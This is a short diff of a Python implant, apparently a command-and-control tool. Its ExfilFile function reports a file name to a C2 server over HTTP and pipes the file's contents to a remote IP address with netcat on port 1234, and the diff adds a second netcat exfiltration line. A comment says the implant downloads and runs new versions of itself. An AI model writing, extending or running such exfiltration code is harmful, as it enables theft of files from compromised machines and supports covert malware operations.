@@ -13,6 +13,7 @@ cwd = implantDir
 def ExfilFile(file, c2, IPAddress):
     urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={file}')
     os.system(f'nc -q0 -w5 {IPAddress} 1234 < {file}')
+    os.system(f'nc -q1 -w5 {IPAddress} 1234 < {file}')
     return
 
 #This will download the new version of the implant, and then run it as a subprocess.
